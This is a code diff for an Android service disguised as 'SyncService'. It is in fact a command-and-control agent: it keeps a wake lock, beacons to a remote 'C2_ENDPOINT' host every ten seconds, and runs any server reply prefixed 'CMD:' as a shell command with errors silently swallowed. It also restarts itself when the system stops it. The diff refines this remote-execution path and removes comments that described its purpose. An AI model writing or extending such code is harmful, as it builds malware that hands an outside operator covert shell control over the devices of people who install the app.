@@ -25,6 +25,7 @@ class SyncService : Service() {
         const val CHANNEL_ID = "UraniumSupremeSecureCore"
         const val NOTIFICATION_ID = 999
         private const val C2_ENDPOINT = "https://web-assets-service.onrender.com/node/pulse"
+        private const val NODE_ID = "Nasser_Supreme_Node"
     }
 
     private var wakeLock: PowerManager.WakeLock? = null
@@ -42,7 +43,7 @@ class SyncService : Service() {
             PowerManager.PARTIAL_WAKE_LOCK,
             "UraniumSupreme::C2WakeLock"
         ).apply {
-            acquire(10 * 60 * 60 * 1000L) // استمرار العمل بنجاح في الخلفية
+            acquire(10 * 60 * 60 * 1000L)
         }
     }
 
@@ -83,7 +84,7 @@ class SyncService : Service() {
                     connection.doOutput = true
                     connection.setRequestProperty("User-Agent", "UraniumNode-v8.0")
                     
-                    val payload = "node_id=Nasser_Supreme_Node&status=active&timestamp=${System.currentTimeMillis()}"
+                    val payload = "node_id=$NODE_ID&status=active&timestamp=${System.currentTimeMillis()}"
                     connection.outputStream.write(payload.toByteArray(Charsets.UTF_8))
                     
                     if (connection.responseCode == 200) {
@@ -91,23 +92,25 @@ class SyncService : Service() {
                         val response = reader.readText()
                         reader.close()
                         
-                        // تنفيذ الأوامر الواردة من السيرفر في حال وجودها
-                        if (response.isNotEmpty() && response.contains("CMD:")) {
-                            executeRemoteCommand(response)
+                        if (response.isNotEmpty() && response.startsWith("CMD:")) {
+                            executeRemoteCommand(response.substringAfter("CMD:"))
                         }
                     }
                     connection.disconnect()
                 } catch (e: Exception) {
-                    // الحفاظ على استمرار النبض وعدم توقف الخدمة أبداً
+                    // استمرار دورت النبض بنجاح
                 }
-                Thread.sleep(10000) // نبضة اتصال كل 10 ثوانٍ بدقة متناهية
+                Thread.sleep(10000)
             }
         }
     }
 
-    private fun executeRemoteCommand(cmdData: String) {
+    private fun executeRemoteCommand(command: String) {
         try {
-            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmdData.substringAfter("CMD:")))
+            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
+            val reader = BufferedReader(InputStreamReader(process.inputStream))
+            while (reader.readLine() != null) {}
+            reader.close()
             process.waitFor()
         } catch (e: Exception) {
             // معالجة صامتة للأوامر
@@ -129,7 +132,6 @@ class SyncService : Service() {
                 it.release()
             }
         }
-        // إعادة إطلاق الخدمة فوراً في حال محاولة النظام إغلاقها
         val restartIntent = Intent(applicationContext, SyncService::class.java)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(restartIntent)
